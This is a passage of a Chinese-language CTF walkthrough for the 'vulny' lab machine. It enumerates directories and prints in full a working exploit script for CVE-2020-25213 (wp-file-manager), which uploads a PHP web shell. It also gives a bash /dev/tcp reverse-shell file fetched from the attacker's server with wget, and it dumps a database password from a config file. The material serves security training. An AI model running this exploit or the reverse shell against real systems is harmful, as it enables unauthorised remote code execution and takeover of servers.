class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">404</span> <span class="operator">-</span>  <span class="number">225</span>B  <span class="operator">-</span> <span class="operator">/</span>secret<span class="symbol">/</span>                                          </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
+<p>找到两个目录 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/javascript/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Ubuntu) Server at 192.168.240.139 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>javascript这个目录没有权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.139/secret/    </span><br><span class="line">Neither &lt;b&gt;/etc/wordpress/config-192.168.240.139.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.240.139.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.   </span><br></pre></td></tr></table></figure></div>
+<p>所以这个secret目录下面是wordpress服务，但是无法解析<br>继续用dirsearch扫描secret下的目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dirsearch -u <span class="number">192.168</span>.<span class="number">240.139</span><span class="regexp">/secret/</span>                        </span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages<span class="regexp">/dirsearch/</span>dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class="comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist <span class="keyword">size</span>: <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="keyword">File</span>: <span class="regexp">/root/</span>tmp<span class="regexp">/reports/</span>_192.<span class="number">168.240</span>.<span class="number">139</span>/_secret__25-<span class="number">02</span>-<span class="number">01</span>_16-<span class="number">42</span>-<span class="number">21</span>.txt</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//192.168.240.139/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">21</span>] Starting: secret/</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.ht_wsr.txt                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.save                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.sample</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.orig</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.bak1                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_extra                           </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessBAK</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htm                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.html</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_sc</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswds                                </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_orig                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD2</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.httr-oauth                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswd_test                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.php                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">33</span>] <span class="number">200</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>readme.html                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">328</span>B  - <span class="regexp">/secret/</span>wp-admin  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-admin/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">330</span>B  - <span class="regexp">/secret/</span>wp-content  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-content/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">471</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/upgrade/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">331</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-includes/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/akismet.php    </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/admin.php</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/                              </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">488</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/uploads/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">514</span>B  - <span class="regexp">/secret/</span>wp-content/                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/rss-functions.php             </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">39</span>] <span class="number">500</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>wp-admin/setup-config.php </span><br></pre></td></tr></table></figure></div>
+<p>找到一些目录<br>wp-content这个目录是一些wordpress的文件 也只有这个目录下面有有用的信息<br><img src="https://pic1.imgdb.cn/item/679de013d0e0a243d4f973a0.png"></p>
+<p>找到了一个插件<br><img src="https://pic1.imgdb.cn/item/679ddfe5d0e0a243d4f9739e.png"><br>这里就不知道如何利用插件的漏洞了，看群主ll104567的视频有了后面的进展 先用searchsploit找到利用的py脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit        wp-file-manager   </span></span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE        | php/webapps/<span class="number">51224.</span>py</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit -m 51224</span></span><br><span class="line">  Exploit: WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE</span><br><span class="line">      <span class="built_in">URL</span>: <span class="keyword">https</span>://www.exploit-db.com/exploits/<span class="number">51224</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/<span class="number">51224.</span>py</span><br><span class="line">    Codes: CVE<span class="number">-2020</span><span class="number">-25213</span></span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII <span class="keyword">text</span> executable, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span> (<span class="number">501</span>)</span><br><span class="line">Copied <span class="built_in">to</span>: /root/tmp/<span class="number">51224.</span>py</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>查看这个脚本做了什么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># cat 51224.py                             </span></span><br><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE</span></span><br><span class="line"><span class="comment"># Date: [ 22-01-2023 ]</span></span><br><span class="line"><span class="comment"># Exploit Author: [BLY]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [https://wpscan.com/vulnerability/10389]</span></span><br><span class="line"><span class="comment"># Version: [ File Manager plugin 6.0-6.9]</span></span><br><span class="line"><span class="comment"># Tested on: [ Debian ]</span></span><br><span class="line"><span class="comment"># CVE : [ CVE-2020-25213 ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> sys,signal,time,requests</span><br><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="comment">#from pprint import pprint</span></span><br><span class="line"></span><br><span class="line">def handler(sig,frame):</span><br><span class="line">	print (<span class="string">&quot;[!]Saliendo&quot;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT,handler)</span><br><span class="line"></span><br><span class="line">def commandexec(command):</span><br><span class="line"></span><br><span class="line">	<span class="attr">exec_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php&quot;</span></span><br><span class="line">	<span class="attr">params</span> <span class="operator">=</span> &#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:command</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">r</span><span class="operator">=</span>requests.get(exec_url,params<span class="operator">=</span>params)</span><br><span class="line"></span><br><span class="line">	<span class="attr">soup</span> <span class="operator">=</span> BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line">	<span class="attr">text</span> <span class="operator">=</span> soup.get_text()</span><br><span class="line"></span><br><span class="line">	print (text)</span><br><span class="line">def exploit():</span><br><span class="line"></span><br><span class="line">	global url</span><br><span class="line"></span><br><span class="line">	<span class="attr">url</span> <span class="operator">=</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="attr">command</span> <span class="operator">=</span> sys.argv[<span class="number">2</span>]</span><br><span class="line">	<span class="attr">upload_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="attr">headers</span> <span class="operator">=</span> &#123;</span><br><span class="line">			&#x27;<span class="params">content-type&#x27;:</span> <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww&quot;</span>,</span><br><span class="line">			&#x27;<span class="params">Connection&#x27;:</span> <span class="string">&quot;close&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">payload</span> <span class="operator">=</span> <span class="string">&quot;------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>cmd<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>upload<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>target<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>l1_Lw<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>upload[]<span class="char escape_">\&quot;</span>; filename=<span class="char escape_">\&quot;</span>shell.php<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type: application/x-php<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;?php echo <span class="char escape_">\&quot;</span>&lt;pre&gt;<span class="char escape_">\&quot;</span> . shell_exec($_REQUEST[&#x27;cmd&#x27;]) . <span class="char escape_">\&quot;</span>&lt;/pre&gt;<span class="char escape_">\&quot;</span>; ?&gt;<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww--&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="params">try:</span></span><br><span class="line">		<span class="attr">r</span><span class="operator">=</span>requests.post(upload_url,data<span class="operator">=</span>payload,headers<span class="operator">=</span>headers)</span><br><span class="line">		<span class="comment">#pprint(r.json())</span></span><br><span class="line">		commandexec(command)</span><br><span class="line">	<span class="params">except:</span></span><br><span class="line">		print(<span class="string">&quot;[!] Algo ha salido mal...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def help():</span><br><span class="line"></span><br><span class="line">	print (<span class="string">&quot;<span class="char escape_">\n</span>[*] Uso: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;<span class="char escape_">\&quot;</span>url<span class="char escape_">\&quot;</span> <span class="char escape_">\&quot;</span>comando<span class="char escape_">\&quot;</span>&quot;</span>)</span><br><span class="line">	print (<span class="string">&quot;[!] Ejemplo: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;http://wordpress.local/ id&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ <span class="operator">==</span> &#x27;<span class="params">__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) <span class="operator">!=</span> <span class="number">3</span>:</span><br><span class="line">		help()</span><br><span class="line"></span><br><span class="line">	<span class="params">else:</span></span><br><span class="line">		exploit()                                                                                                                     </span><br></pre></td></tr></table></figure></div>
+<p>可以直接到web访问路径&#x2F;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php<br>后面?cmd&#x3D; 传入要执行的命令也可以</p>
+<p>cmd传入命令 然后执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span>               </span><br><span class="line"></span><br><span class="line">[*] Uso: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> <span class="string">&quot;url&quot;</span> <span class="string">&quot;comando&quot;</span></span><br><span class="line">[!] Ejemplo: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://wordpress.local/ id</span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://<span class="number">192.168</span>.<span class="number">240.139</span>/secret id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
+<p>根据使用示例知道了用法 把id改成要执行的命令<br>然后反弹shell  但是这里用nc没有办法反弹回shell<br>用另外一种方式  写一个reverse.sh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.240.83</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>   </span><br></pre></td></tr></table></figure></div>
+<p>启动http服务 让web那边可以接受到本机的文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.   server                                                              </span></span><br><span class="line">Serving HTTP <span class="literal">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> (http:<span class="regexp">//0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
+<p>在web端输入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=wget 192.168.240.83:8000/reverse.sh</span><br><span class="line">?<span class="attribute">cmd</span>=bash reverse.sh</span><br></pre></td></tr></table></figure></div>
+<p>拿到shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -<span class="keyword">lp</span> <span class="number">1234</span></span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="keyword">set</span> terminal process group (<span class="number">650</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="keyword">no</span> job control in this <span class="keyword">shell</span></span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ </span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据最开始的提示有信息的php文件，找到这个文件，查看内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span>cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
+<p>这里有数据库密码 myfuckingpassword<br>看了wp 在去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中找内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">www-data@vulny:/usr/share/wordpress$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    